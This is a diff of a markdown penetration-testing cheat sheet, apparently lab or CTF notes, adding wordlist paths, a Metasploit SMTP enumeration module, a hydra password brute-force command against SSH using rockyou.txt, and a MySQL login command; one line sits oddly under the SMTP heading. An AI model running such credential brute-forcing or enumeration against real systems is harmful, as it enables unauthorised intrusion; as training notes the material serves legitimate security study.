@@ -6,6 +6,10 @@
 * ```systemctl stop myservice```
 * [-h / -help / --help] or man
 * https://www.exploit-db.com/exploits/20745
+* words `sudo apt install seclists`
+https://github.com/security-cheatsheet/metasploit-cheat-sheet 
+
+
 
 ### Commands 
 * SSH with key `ssh -i <key-file> <username>@<ip>`
@@ -20,6 +24,10 @@
    * This file is the private key ```id_rsa```
    * change the file permission ``` chmod 600 ```
    * `ssh -i <key-file> <username>@<ip> `
+  ### Wordlists 
+   * /usr/share/wordlists/SecLists/Usernames
+   *  if not found install it `sudo apt install seclists`
+   *  /usr/share/wordlists/rockyou.txt 
   ### Nmap
 
 
@@ -68,6 +76,22 @@
 ### Exploiting
 * create folder `mkdir /tmp/mount`
 * mount folder `sudo mount -t nfs IP:share /tmp/mount/ -nolock`
+
+## SMTP 25
+### Enumeration
+* nmap
+* msfconsole
+* auxiliary/scanner/smtp/smtp_enum
+### Exploiting
+* ` hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV MACHINE_IP ssh` 
+
+## MYSQL 3306
+### Install 
+* ` sudo apt install default-mysql-client`
+### Enumeration
+* nmap
+### Exploiting
+* ` mysql -h [IP] -u [username] -p` 
 
 # Shells 
 ## Simple Shell msfvenom 
